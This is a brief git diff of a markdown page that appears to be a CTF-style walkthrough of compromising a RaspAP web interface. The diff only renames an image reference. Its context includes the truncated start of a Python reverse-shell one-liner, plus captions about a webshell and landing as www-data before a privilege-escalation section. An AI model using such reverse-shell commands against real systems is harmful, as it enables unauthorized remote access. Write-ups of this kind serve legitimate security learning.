@@ -114,7 +114,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 <figure><img src="../../../.gitbook/assets/image (7) (9).png" alt=""><figcaption><p>RaspAP Webshell</p></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (14) (4).png" alt=""><figcaption><p>Landed as www-data</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption><p>Landed as www-data</p></figcaption></figure>
 
 ## Privilege Escalation
 
